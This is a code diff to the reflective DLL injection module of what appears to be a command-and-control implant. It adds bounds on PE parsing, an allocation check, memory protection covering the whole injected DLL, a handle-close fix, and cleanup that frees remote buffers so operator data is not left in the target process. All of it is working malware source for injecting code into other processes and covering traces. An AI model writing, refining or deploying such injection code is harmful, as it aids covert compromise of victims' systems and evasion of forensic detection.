@@ -44,7 +44,7 @@ DWORD Inject(
     BOOL   IsWow64 = FALSE;
 
     /* check if required params have been specified */
-    if ( ( ( ! Handle ) && ( ! Pid ) ) || ( ( ! Payload ) && ( ! Size ) ) ) {
+    if ( ( ( ! Handle ) && ( ! Pid ) ) || ( ! Payload ) || ( ! Size ) ) {
         return INJECT_ERROR_INVALID_PARAM;
     }
 
@@ -197,7 +197,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
     if ( ProcessIsWow( hTargetProcess ) ) // check if remote process x86
     {
         x64 = FALSE;
-        if ( GetPeArch( DllBuffer ) != PROCESS_ARCH_X86 ) // check if dll is x64
+        if ( GetPeArch( DllBuffer, DllLength ) != PROCESS_ARCH_X86 ) // check if dll is x64
         {
             PUTS( "[ERROR] trying to inject a x64 payload into a x86 process. ABORT" );
             return ERROR_INJECT_PROC_PAYLOAD_ARCH_DONT_MATCH_X64_TO_X86;
@@ -205,14 +205,14 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
     }
     else
     {
-        if ( GetPeArch( DllBuffer ) != PROCESS_ARCH_X64 ) // check if dll is x64
+        if ( GetPeArch( DllBuffer, DllLength ) != PROCESS_ARCH_X64 ) // check if dll is x64
         {
             PUTS( "[ERROR] trying to inject a x86 payload into a x64 process. ABORT" );
             return ERROR_INJECT_PROC_PAYLOAD_ARCH_DONT_MATCH_X86_TO_X64;
         }
     }
 
-    if ( ( ReflectiveLdrOffset = GetReflectiveLoaderOffset( DllBuffer ) ) ) {
+    if ( ( ReflectiveLdrOffset = GetReflectiveLoaderOffset( DllBuffer, DllLength ) ) ) {
         PUTS( "The DLL has a Reflective Loader already defined" );
         HasRDll     = TRUE;
         FullDll     = DllBuffer;
@@ -221,6 +221,13 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
         PUTS( "The DLL does not have a Reflective Loader defined, using KaynLdr" );
         HasRDll     = FALSE;
         FullDll     = Instance->Win32.LocalAlloc( LPTR, DllLdrSize + DllLength );
+        if ( ! FullDll )
+        {
+            PUTS( "[ERROR] Failed to allocate memory for the full dll" )
+            ReturnValue = -1;
+            goto Cleanup;
+        }
+
         FullDllSize = DllLdrSize + DllLength;
         MemCopy( FullDll, DllLdr, DllLdrSize );
         MemCopy( FullDll + DllLdrSize, DllBuffer, DllLength );
@@ -268,7 +275,8 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
 
             ReflectiveLdr = RVA( LPVOID, MemLibraryBuffer, ReflectiveLdrOffset );
             MemRegion     = MemLibraryBuffer - ( ( ( UINT_PTR ) MemLibraryBuffer ) % 8192 );    // size of shellcode? change it to rx
-            MemRegionSize = 16384;
+            /* protect the entire written dll, not just the first 16 kb */
+            MemRegionSize = FullDllSize + ( ( SIZE_T ) ( ( UINT_PTR ) MemLibraryBuffer - ( UINT_PTR ) MemRegion ) );
             BytesWritten    = 0;
 
             // NtStatus = Instance->Win32.NtProtectVirtualMemory( hTargetProcess, &MemRegion, &MemRegionSize, PAGE_EXECUTE_READ, &OldProtect );
@@ -309,6 +317,14 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
     ReturnValue = -1;
 
 Cleanup:
+    /* free the remote parameter buffer on every failure path so we
+     * don't leave operator data behind in the target */
+    if ( ReturnValue != 0 && MemParamsBuffer )
+    {
+        MmVirtualFree( hTargetProcess, MemParamsBuffer );
+        MemParamsBuffer = NULL;
+    }
+
     if ( ! HasRDll && FullDll )
     {
         MemSet( FullDll, 0, FullDllSize );
@@ -327,7 +343,7 @@ DWORD DllSpawnReflective( LPVOID DllLdr, DWORD DllLdrSize, LPVOID DllBuffer, DWO
     PWCHAR              SpawnProc   = NULL;
     DWORD               Result      = 0;
 
-    if ( GetPeArch( DllBuffer ) == PROCESS_ARCH_X86 ) // check if dll is x64
+    if ( GetPeArch( DllBuffer, DllLength ) == PROCESS_ARCH_X86 ) // check if dll is x64
         SpawnProc = Instance->Config.Process.Spawn86;
     else
         SpawnProc = Instance->Config.Process.Spawn64;
@@ -342,7 +358,8 @@ DWORD DllSpawnReflective( LPVOID DllLdr, DWORD DllLdrSize, LPVOID DllBuffer, DWO
         {
             PUTS( "Failed" )
             ProcessTerminate( ProcessInfo.hProcess, 0 );
-            SysNtClose( ProcessInfo.hProcess );
+            /* NOTE: ProcessCreate(Piped) registered hProcess in the jobs list
+             * which closes it on JobRemove. don't close it here as well */
             SysNtClose( ProcessInfo.hThread );
         }
     }
